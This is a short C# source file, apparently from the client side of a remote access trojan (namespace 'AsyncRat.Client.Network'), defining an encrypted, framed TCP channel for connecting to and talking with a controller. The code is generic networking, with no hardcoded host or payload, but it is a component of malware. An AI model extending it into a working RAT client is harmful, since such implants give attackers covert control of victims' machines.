using System.Net.Sockets;

namespace AsyncRat.Client.Network;

public sealed class TcpChannel : IAsyncDisposable
{
    private TcpClient? _tcp;
    private NetworkStream? _stream;
    private readonly PacketFramer _framer;
    private readonly CryptoLayer _crypto;

    public bool IsConnected => _tcp?.Connected ?? false;

    public TcpChannel(PacketFramer framer, CryptoLayer crypto)
    {
        _framer = framer;
        _crypto = crypto;
    }

    public async Task ConnectAsync(string host, int port, CancellationToken ct = default)
    {
        await DisconnectAsync();
        _tcp = new TcpClient();
        await _tcp.ConnectAsync(host, port, ct);
        _stream = _tcp.GetStream();
        _stream.ReadTimeout = 120_000;
        _stream.WriteTimeout = 30_000;
    }

    public async Task SendAsync(byte[] data, CancellationToken ct = default)
    {
        if (_stream is null) throw new InvalidOperationException("Not connected");
        var encrypted = _crypto.Encrypt(data);
        var frame = _framer.Frame(encrypted);
        await _stream.WriteAsync(frame, ct);
        await _stream.FlushAsync(ct);
    }

    public async Task<byte[]> ReceiveAsync(CancellationToken ct = default)
    {
        if (_stream is null) throw new InvalidOperationException("Not connected");
        var frame = await _framer.ReadFrameAsync(_stream, ct);
        return _crypto.Decrypt(frame);
    }

    public async Task DisconnectAsync()
    {
        if (_stream is not null)
        {
            await _stream.DisposeAsync();
            _stream = null;
        }
        if (_tcp is not null)
        {
            _tcp.Close();
            _tcp.Dispose();
            _tcp = null;
        }
    }

    public async ValueTask DisposeAsync() => await DisconnectAsync();
}
